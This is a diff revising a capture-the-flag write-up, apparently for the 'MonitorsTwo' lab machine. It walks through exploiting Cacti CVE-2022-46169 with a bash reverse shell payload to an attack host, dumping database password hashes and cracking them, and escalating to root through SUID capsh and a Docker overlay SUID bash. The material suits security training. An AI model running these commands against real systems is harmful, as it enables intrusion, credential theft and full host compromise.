@@ -372,47 +372,60 @@ From `marcus`'s terminal:
 
 ## Extra - Manual exploitation
 
+### Initial foothold
+
 We can manually perform [CVE-2022-46169](https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/). Let's remember what needs to be done (based on [Rapid7's post](https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/)):
 
-  _If `LOCAL_DATA_ID` and/or `HOST_ID` are not set, the module will try to bruteforce the missing value(s). If a valid combination is found, the module will use these to attempt exploitation. If `LOCAL_DATA_ID` and/or `HOST_ID` are both set, the module will immediately attempt exploitation. During exploitation, the module sends a `GET` request to `/remote_agent.php` with the action parameter set to `polldata` and the `X-Forwarded-For` header set to the provided value for `X_FORWARDED_FOR_IP` (by default `127.0.0.1`)._
+  1. If `LOCAL_DATA_ID` and/or `HOST_ID` are not set, the module will try to bruteforce the missing value(s). If a valid combination is found, the module will use these to attempt exploitation. 
+  2. If `LOCAL_DATA_ID` and/or `HOST_ID` are both set, the module will immediately attempt exploitation. 
+  3. During exploitation, the module sends a `GET` request to `/remote_agent.php` with the action parameter set to `polldata` and the `X-Forwarded-For` header set to the provided value for `X_FORWARDED_FOR_IP` (by default `127.0.0.1`).
 
 We can start by intercepting a request via Burp, for example, a `POST` login request using random creds, change the HTTP method to `GET` request and the URL to `/remote_agent.php?action=polldata&local_data_ids[]={local_data_ids}&host_id={host_id}&poller_id=1{payload}`:
 
-> _We can find the required URL [here](https://www.exploit-db.com/exploits/51166)._
+> _The URL path can be found [here](https://www.exploit-db.com/exploits/51166)._
 
 ![](burp_login_request.png)
 
 ![](burp_fatal_error.png)
 
-We get the error `FATAL: You are not authorized to use this service`. Let's start add the `X-Forwarded-For` header with the value of `localhost` and see what happens:
+We get the error `FATAL: You are not authorized to use this service`. Let's start by adding the `X-Forwarded-For` header with the value of `localhost` and see what happens:
 
 ![](xForwardedFor.png)
 
-No we did not get a `FATAL` error, but a `Validation error` regarding the `host_id` parameter. Let's remove the variables, set all IDs to `1`, and try a simple payload, such as `sleep 5`:
+This time, we did not get a `FATAL` error, but a `Validation error` regarding the `host_id` parameter. Let's remove the variables, set all IDs to `1`, and try a simple payload, such as `sleep 5`:
+
+> _The `sleep+5` payload is the URL-encoded version of `sleep 5` payload._
 
 ![](sleep_attempt.png)
 
-We get no errors back, but the payload did not work either. That makes sense because remember that "_If a valid combination is found, the module will use these to attempt exploitation_". Thus, we need to brute force the `local_data_id` and `host_id` parameters, until our payload works. We can do that using Intruder for that:
+We get no errors back, but the payload did not work either. That makes sense because based on the vulnerability's descrition:
+
+  If a valid combination is found, the module will use these to attempt exploitation. 
+
+Thus, we need to brute force the `local_data_id` and `host_id` parameters, until we we find a valid combination of values that will make our payload to work. We can do that using Intruder:
 
 ![](payload_pos.png)
 
-![](payload_settings.png)
+![](payload_settings.png){: .normal width="65%"}
 
-![](brute_results.png)
+> _Both payload `1` and `2` are defined as a sequential list of numbers from `1` to `10`._
+
+![](brute_results.png){: .normal width="75%"}
 
 Intruder shows that just one combination of payloads resulted in a delay of 5 secs (caused by our `sleep+5` payload): `local_data_ids[]=6` and `host_id=1`! Let's confirm that manually:
 
 ![](burp_responseTime.png)
 
-What happens here is that some values of the HTTP reponse `rdd_name` parameter are exploitable: `uptime` is one of them (we can find the rest of [here](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/http/cacti_unauthenticated_cmd_injection.rb#L143)). So, we brute-forcing the `local_data_id` and `host_id` parameters until one combination of them returns one of the exploitable parameters in the response:
+What happens here is that some values of the HTTP reponse `rdd_name` parameter are exploitable: `uptime` is one of them (we can find the full list of the exloitable parameters [here](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/http/cacti_unauthenticated_cmd_injection.rb#L143)). So, we brute-forcing the `local_data_id` and `host_id` parameters until one combination of them returns one of the exploitable parameters in the response:
 
-![](uptime.png)
+![](proc.png){: .normal width="75%"}
 
-![](proc.png)
+![](uptime.png){: .normal width="75%"}
 
-Now we have found the right combination of parameter values, we can pass a reverse shell as a payload, such as `bash -c 'bash -i >& /dev/tcp/10.10.14.6/1337 0>&1'`, URL-encode it (by pressing `CTRL+U`), open a listener on our attack host, and sent the request:
+Now that we have found the right combination of parameter values, we can pass some reverse shell code as a payload, such as `bash -c 'bash -i >& /dev/tcp/10.10.14.6/1337 0>&1'`, URL-encode it (by pressing `CTRL+U`), open a listener on our attack host, and sent the request:
 
 ```bash
+# setting up a listener
 $ nc -lnvp 1337
 listening on [any] 1337 ...
 connect to [10.10.14.6] from (UNKNOWN) [10.10.11.211] 36722
@@ -421,6 +434,7 @@ connect to [10.10.14.6] from (UNKNOWN) [10.10.11.211] 36722
 ![](revshell_payload.png)
 
 ```bash
+# catching the revese shell
 $ nc -lnvp 1337
 listening on [any] 1337 ...
 connect to [10.10.14.6] from (UNKNOWN) [10.10.11.211] 36722
@@ -429,9 +443,12 @@ bash: no job control in this shell
 www-data@50bca5e748b0:/var/www/html$
 ```
 
-Python is not installed on the target, thus, we can't use `pty` to stabilize our shell. However, we can use `script` in a similar fashion:
+### Lateral movement
+
+Ideally, we should first stabilize our shell. Python is not installed on the target, thus, we can't use the `pty` module to achieve that. However, we can use `script`:
 
 ```bash
+# shell stabilization using script
 www-data@50bca5e748b0:/var/www/html$ which script
 which script
 /usr/bin/script
@@ -449,7 +466,7 @@ nc -lvnp 1337
 www-data@50bca5e748b0:/var/www/html$
 ```
 
-Back on our attack host:
+We now need to get the values for the `rows` and `cols` variables from our attack host:
 
 ```bash
 $ stty -a
@@ -461,21 +478,23 @@ opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
 isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
 ```
 
-And finally, back on our target:
+And finally, we need to set the same values on our target:
 
 ```bash
 www-data@50bca5e748b0:/var/www/html$ stty rows 51 cols 209
 www-data@50bca5e748b0:/var/www/html$ export TERM=xterm
 ```
 
-And success, we have our initial foothold with a proper bash shell! Since this is a web app server, we should probably check for database configuration files first:
+And success, we have our initial foothold with a proper bash shell! Since this is a web app server, we should probably check for database configuration files:
 
 ```bash
+# searching for configuration files
 www-data@50bca5e748b0:/var/www/html$ find . | grep config
 ./include/config.php
 ./docs/images/graphs-edit-nontemplate-configuration.png
 ./docs/apache_template_config.html
 
+# searching for database-related strings within the configuration file
 www-data@50bca5e748b0:/var/www/html$ grep database include/config.php
  * Make sure these values reflect your actual database/host/user/password
 $database_type     = 'mysql';
@@ -505,9 +524,10 @@ $database_persist  = false;
  * are defined in lib/database.php
 ```
 
-We can now use the information above to connect to the database server:
+The configuration file above contains all we need in order to connect to the database server:
 
 ```bash
+# connecting to the mysql server
 www-data@50bca5e748b0:/var/www/html$ mysql -u root -proot -h db
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MySQL connection id is 221
@@ -516,7 +536,7 @@ Server version: 5.7.40 MySQL Community Server (GPL)
 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
 
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-
+# listing databases
 MySQL [(none)]> show databases;
 +--------------------+
 | Database           |
@@ -528,113 +548,18 @@ MySQL [(none)]> show databases;
 | sys                |
 +--------------------+
 5 rows in set (0.002 sec)
-
+# selecting database
 MySQL [(none)]> use cacti;
 Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
 
 Database changed
+# listing databases's tables
 MySQL [cacti]> show tables;
 +-------------------------------------+
 | Tables_in_cacti                     |
 +-------------------------------------+
-| aggregate_graph_templates           |
-| aggregate_graph_templates_graph     |
-| aggregate_graph_templates_item      |
-| aggregate_graphs                    |
-| aggregate_graphs_graph_item         |
-| aggregate_graphs_items              |
-| automation_devices                  |
-| automation_graph_rule_items         |
-| automation_graph_rules              |
-| automation_ips                      |
-| automation_match_rule_items         |
-| automation_networks                 |
-| automation_processes                |
-| automation_snmp                     |
-| automation_snmp_items               |
-| automation_templates                |
-| automation_tree_rule_items          |
-| automation_tree_rules               |
-| cdef                                |
-| cdef_items                          |
-| color_template_items                |
-| color_templates                     |
-| colors                              |
-| data_debug                          |
-| data_input                          |
-| data_input_data                     |
-| data_input_fields                   |
-| data_local                          |
-| data_source_profiles                |
-| data_source_profiles_cf             |
-| data_source_profiles_rra            |
-| data_source_purge_action            |
-| data_source_purge_temp              |
-| data_source_stats_daily             |
-| data_source_stats_hourly            |
-| data_source_stats_hourly_cache      |
-| data_source_stats_hourly_last       |
-| data_source_stats_monthly           |
-| data_source_stats_weekly            |
-| data_source_stats_yearly            |
-| data_template                       |
-| data_template_data                  |
-| data_template_rrd                   |
-| external_links                      |
-| graph_local                         |
-| graph_template_input                |
-| graph_template_input_defs           |
-| graph_templates                     |
-| graph_templates_gprint              |
-| graph_templates_graph               |
-| graph_templates_item                |
-| graph_tree                          |
-| graph_tree_items                    |
-| host                                |
-| host_graph                          |
-| host_snmp_cache                     |
-| host_snmp_query                     |
-| host_template                       |
-| host_template_graph                 |
-| host_template_snmp_query            |
-| plugin_config                       |
-| plugin_db_changes                   |
-| plugin_hooks                        |
-| plugin_realms                       |
-| poller                              |
-| poller_command                      |
-| poller_data_template_field_mappings |
-| poller_item                         |
-| poller_output                       |
-| poller_output_boost                 |
-| poller_output_boost_local_data_ids  |
-| poller_output_boost_processes       |
-| poller_output_realtime              |
-| poller_reindex                      |
-| poller_resource_cache               |
-| poller_time                         |
-| processes                           |
-| reports                             |
-| reports_items                       |
-| sessions                            |
-| settings                            |
-| settings_tree                       |
-| settings_user                       |
-| settings_user_group                 |
-| sites                               |
-| snmp_query                          |
-| snmp_query_graph                    |
-| snmp_query_graph_rrd                |
-| snmp_query_graph_rrd_sv             |
-| snmp_query_graph_sv                 |
-| snmpagent_cache                     |
-| snmpagent_cache_notifications       |
-| snmpagent_cache_textual_conventions |
-| snmpagent_managers                  |
-| snmpagent_managers_notifications    |
-| snmpagent_mibs                      |
-| snmpagent_notifications_log         |
+<SNIP>
 | user_auth                           |
 | user_auth_cache                     |
 | user_auth_group                     |
@@ -651,7 +576,7 @@ MySQL [cacti]> show tables;
 | version                             |
 +-------------------------------------+
 111 rows in set (0.001 sec)
-
+# dumping the first row of the table to enumarate its fields
 MySQL [cacti]> SELECT * FROM user_auth LIMIT 1 \G;
 *************************** 1. row ***************************
                     id: 1
@@ -682,7 +607,7 @@ policy_graph_templates: 1
 1 row in set (0.000 sec)
 
 ERROR: No query specified
-
+# select the fields of interest of all users from the table
 MySQL [cacti]> SELECT username, password FROM user_auth ;
 +----------+--------------------------------------------------------------+
 | username | password                                                     |
@@ -694,28 +619,24 @@ MySQL [cacti]> SELECT username, password FROM user_auth ;
 3 rows in set (0.001 sec)
 ```
 
+> [The `\G` modifier in the MySQL command line client](https://pento.net/2009/02/27/the-g-modifier-in-the-mysql-command-line-client/).
+
 We can now try to crack these hashes in our attack host by first using `hashcat`'s autodetect mode to find out the hash type:
 
 ```bash
 $ cat hashes
 admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
 marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
-
+# using hashcat's autodetect mode
 $ hashcat hashes /usr/share/wordlists/rockyou.txt --username
 hashcat (v6.2.6) starting in autodetect mode
 
-OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
-=============================================================
-* Device #1: Intel(R) Graphics [0x9a60], 3200/6465 MB (512 MB allocatable), 32MCU
-
-OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
-==================================================================================================================================================
-* Device #2: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, skipped
+<SNIP>
 
 The following 4 hash-modes match the structure of your input hash:
 
       # | Name                                                       | Category
-  ======+============================================================+======================================
+  ======+============================================================+========================
    3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
   25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
   25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
@@ -727,7 +648,7 @@ Started: Fri Jan 26 06:42:36 2024
 Stopped: Fri Jan 26 06:42:38 2024
 ```
 
-Our hashes start with `$2y$`, so let's go with `3200` mode:
+Our hashes start with `$2y$`, which resemble `bcrypt` format for OSs, so we will choose the mode `3200`:
 
 ```bash
 $ hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --username
@@ -751,7 +672,7 @@ $ hashcat -m 3200 --username --show hashes
 marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
 ```
 
-Now we have creds, `marcus:funkymonkey`, let's try to SSH using them:
+We can now use these creds, `marcus:funkymonkey`, for logging into SSH:
 
 ```bash
 $ ssh marcus@10.10.11.211
@@ -763,11 +684,13 @@ Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
 marcus@monitorstwo:~$
 ```
 
-Upon logging in, we see the notification `You have mail.`! Let's go check it, after grabbing our user flag:
+### Privilege escalation
+
+Upon logging into SSH, we see the notification `You have mail.`! Let's go check it, after grabbing our user flag:
 
 ```bash
 marcus@monitorstwo:~$ cat user.txt
-90dde9ef32a7e519657dc3b222360421
+<SNIP>
 
 marcus@monitorstwo:~$ ls /var/mail/
 marcus
@@ -801,109 +724,111 @@ The above email let us know about 3 CVEs, so let's check them in sequence:
 
 1. [CVE-2021-33033](https://nvd.nist.gov/vuln/detail/CVE-2021-33033) refers to a kernel vulnerability, so first we need to see our target's kernel:
 
-  ```bash
-  marcus@monitorstwo:~$ uname -a
-  Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
-  ```
+```bash
+marcus@monitorstwo:~$ uname -a
+Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+```
 
-  This is a `2021` vulnerability for versions before `5.11.14`. Our version is not compatible and we can also see from the output above that the email was compiled 2 years after, i.e., `UTC 2023`!
+This is a `2021` vulnerability for versions before `5.11.14`. Our version a more recent one (although `5.4.0-147` seems older than `5.11.14`, but that's due to conventions) and we can also see from the output that the email was compiled 2 years after the discovery of this vulnerability, i.e., `UTC 2023`!
 
-2. [CVE-2020-25706](https://nvd.nist.gov/vuln/detail/CVE-2020-25706) is an XSS vulnerability for `Cacti 1.2.13` and the target app's version is `Cacti 1.2.22`. Additionally, we have already exploited this service!
+2. [CVE-2020-25706](https://nvd.nist.gov/vuln/detail/CVE-2020-25706) is an XSS vulnerability for `Cacti 1.2.13` and the target app's version is `Cacti 1.2.22`. What's more, we have already exploited this service!
 
-    ![](home.png)
+![](home.png){: .normal width="60%"}
 
-3. So, we have left with just the last one: [CVE-2021-41091](https://nvd.nist.gov/vuln/detail/CVE-2021-41091), which refers to `docker`'s engine `Moby 20.10.9` version.
+3. We have left with just the last one: [CVE-2021-41091](https://nvd.nist.gov/vuln/detail/CVE-2021-41091), which refers to `docker`'s engine `Moby 20.10.9` version.
 
-  ```bash
-  marcus@monitorstwo:~$ docker --version
-  Docker version 20.10.5+dfsg1, build 55c4c88
-  ```
+```bash
+# checking docker's verion
+marcus@monitorstwo:~$ docker --version
+Docker version 20.10.5+dfsg1, build 55c4c88
+```
 
-  Docker's version seems to vulnerable! We can list all the `docker` directories as follows:
+Docker's version seems to vulnerable! We can list all the `docker` directories as follows:
 
-  > _The vulnerability description refers to directories under `/var/lib/docker/`, so we are only interested in those._
+> _The vulnerability description refers to directories under `/var/lib/docker/`, so we are only interested in those._
 
-  ```bash
-  marcus@monitorstwo:~$ findmnt
-  TARGET                                SOURCE     FSTYPE     OPTIONS
+```bash
+# listing docker's containers
+marcus@monitorstwo:~$ findmnt
+TARGET                                SOURCE     FSTYPE     OPTIONS
 
-  <SNIP>
-  │                                                nsfs       rw
-  ├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
-  │                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/docker/over
-  ├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
-  │                                     shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
-  ├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
-  │                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/over
-  └─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
-                                        shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
-  ```
+<SNIP>
+│                                                nsfs       rw
+├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/docker/over
+├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
+│                                     shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
+├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/over
+└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
+                                      shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
+```
 
-  We must find out which one is associated with `Cacti`, since our containerized shell session is within that. We can do that by creating a file from within our containerized shell session (our initial foothold), and then check if this file is available from outside the container with `marcus`.
+We must figure out which one is associated with the `Cacti` app, since our containerized shell session is within that. We can do that by creating a file from within our containerized shell session (our initial foothold), and then check if this file is available from outside the container with `marcus`.
 
-  ```bash
-  # move to the tmp directory and create a file
-  www-data@50bca5e748b0:/var/www/html$ cd /tmp
-  www-data@50bca5e748b0:/tmp$ touch test
-  ```
+```bash
+# move to the tmp directory and create a file
+www-data@50bca5e748b0:/var/www/html$ cd /tmp
+www-data@50bca5e748b0:/tmp$ touch test
+```
 
-  The heaviest contents are usually images and if the default storage driver `overlay2` is used, then these Docker images are stored in `/var/lib/docker/overlay2` ([freecodecamp](https://www.freecodecamp.org/news/where-are-docker-images-stored-docker-container-paths-explained/)). Therefore, we can only check 2/4 paths above different `docker` containers:
+The heaviest contents are usually images and if the default storage driver `overlay2` is used, then these Docker images are stored in `/var/lib/docker/overlay2` ([freecodecamp](https://www.freecodecamp.org/news/where-are-docker-images-stored-docker-container-paths-explained/)). Therefore, we really need to check just 2 out of the 4 container paths found above:
 
-  Now we can check each these 2 containers in sequence to see which one contains the `test` file:
+We can check each these 2 containers in sequence to see which one contains the `test` file:
 
-  ```bash
-  marcus@monitorstwo:~$ ls -l /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test
-  ls: cannot access '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test': No such file or directory
-  marcus@monitorstwo:~$ ls -l /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test
-  -rw-r--r-- 1 www-data www-data 0 Jan 26 08:00 /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test
-  ```
+```bash
+marcus@monitorstwo:~$ ls -l /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test
+ls: cannot access '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test': No such file or directory
+marcus@monitorstwo:~$ ls -l /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test
+-rw-r--r-- 1 www-data www-data 0 Jan 26 08:00 /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test
+```
 
-  The container associated with the Capti app is: `c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1`. Now, we need to assign `SUID` permissions to `/bin/bash`, so `marcus` can access it from outside. In order to do that, we need to escalate our privileges within the container. Let's search for `SUID` files:
+The container associated with the Capti app is: `c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1`. Now, we need to assign `SUID` permissions to `/bin/bash`, so `marcus` can access it from outside. In order to do that, we need to escalate our privileges within the container. Let's search for `SUID` files:
 
-  ```bash
-  www-data@50bca5e748b0:/tmp$ find / -perm -4000 2>/dev/null
-  /usr/bin/gpasswd
-  /usr/bin/passwd
-  /usr/bin/chsh
-  /usr/bin/chfn
-  /usr/bin/newgrp
-  /sbin/capsh
-  /bin/mount
-  /bin/umount
-  /bin/su
-  ```
+```bash
+www-data@50bca5e748b0:/tmp$ find / -perm -4000 2>/dev/null
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newgrp
+/sbin/capsh
+/bin/mount
+/bin/umount
+/bin/su
+```
 
-  The `/sbin/capsh` stands out from the above output. Searching [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/#suid) we get this:
+The `/sbin/capsh` stands out from the above output. Searching [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/#suid) we get this:
 
-  ![](gtfobins.png){: .normal width="60%"}
+![](gtfobins.png){: .normal width="60%"}
 
-  Let's follow GFTO's guidance:
+Following GFTO's guidance:
 
-  ```bash
-  www-data@50bca5e748b0:/tmp$ /sbin/capsh --gid=0 --uid=0 --
-  root@50bca5e748b0:/tmp# id
-  uid=0(root) gid=0(root) groups=0(root),33(www-data)
-  ```
+```bash
+www-data@50bca5e748b0:/tmp$ /sbin/capsh --gid=0 --uid=0 --
+root@50bca5e748b0:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+```
 
-  And we got root! Now, we can copy the bash binary into `/tmp` and give it `SUID` permissions:
+And we got root! Now, we give `SUID` permissions to the bash binary:
 
-  ```bash
-  # assign suid perms to bash binary
-  root@50bca5e748b0:/tmp# chmod u+s /bin/bash
-  # confirm permissions
-  root@50bca5e748b0:/tmp# ls -l /bin/bash
-  -rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
-  ```
+```bash
+# assign suid perms to bash binary
+root@50bca5e748b0:/tmp# chmod u+s /bin/bash
+# confirm permissions
+root@50bca5e748b0:/tmp# ls -l /bin/bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+```
 
-  Finally, we can go back to `marcus` SSH session and execute bash using the [`-p`](https://www.gnu.org/software/bash/manual/html_node/The-Set-Builtin.html#:~:text=If%20the%20%2Dp%20option%20is,real%20user%20and%20group%20ids.&text=Enable%20restricted%20shell%20mode.,once%20it%20has%20been%20set.) flag:
+Finally, we can go back to `marcus` SSH session and execute the bash binary using the [`-p`](https://www.gnu.org/software/bash/manual/html_node/The-Set-Builtin.html#:~:text=If%20the%20%2Dp%20option%20is,real%20user%20and%20group%20ids.&text=Enable%20restricted%20shell%20mode.,once%20it%20has%20been%20set.) flag:
 
-  ```bash
-  marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin
-  marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ls -l bash
-  -rwsr-xr-x 1 root root 1234376 Mar 27  2022 bash
-  marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ./bash -p
-  bash-5.1# id
-  uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
-  bash-5.1# cat /root/root.txt
-  660d3fa486300694d14db919e5fb6dc6
-  ```
+```bash
+marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ls -l bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 bash
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ./bash -p
+bash-5.1# id
+uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
+bash-5.1# cat /root/root.txt
+<SNIP>
+```
